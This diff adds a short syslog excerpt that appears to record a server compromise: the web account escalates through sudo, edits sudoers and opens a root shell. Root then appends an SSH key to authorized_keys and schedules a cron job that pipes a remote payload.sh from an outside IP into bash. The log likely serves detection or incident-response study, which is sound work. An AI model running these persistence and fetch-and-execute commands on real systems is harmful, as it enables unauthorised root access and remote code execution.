@@ -1,0 +1,15 @@
+May 16 16:08:11 app01 sudo: www-data : TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/find
+May 16 16:08:11 app01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by www-data(uid=33)
+May 16 16:08:12 app01 sudo: pam_unix(sudo:session): session closed for user root
+May 16 16:08:17 app01 sshd[31221]: Accepted publickey for www-data from 172.16.40.88 port 55211 ssh2: RSA SHA256:rM9K8m4eP1xQv7L2sYcFq1aD0n3Rt2Ab
+May 16 16:08:18 app01 sshd[31221]: pam_unix(sshd:session): session opened for user www-data(uid=33) by (uid=0)
+May 16 16:08:21 app01 sudo: www-data : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/vim /etc/sudoers
+May 16 16:08:21 app01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by www-data(uid=33)
+May 16 16:08:45 app01 sudo: pam_unix(sudo:session): session closed for user root
+May 16 16:09:02 app01 sudo: www-data : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+May 16 16:09:02 app01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by www-data(uid=33)
+May 16 16:09:04 app01 bash[31288]: uid=0(root) gid=0(root) groups=0(root)
+May 16 16:09:12 app01 systemd: Started Session 4412 of user root.
+May 16 16:09:18 app01 bash[31302]: echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG...' >> /root/.ssh/authorized_keys
+May 16 16:09:25 app01 CRON[31311]: (root) CMD (/usr/bin/curl -fsSL http://198.51.100.42/payload.sh | bash)
+May 16 16:09:31 app01 sudo: pam_unix(sudo:session): session closed for user root
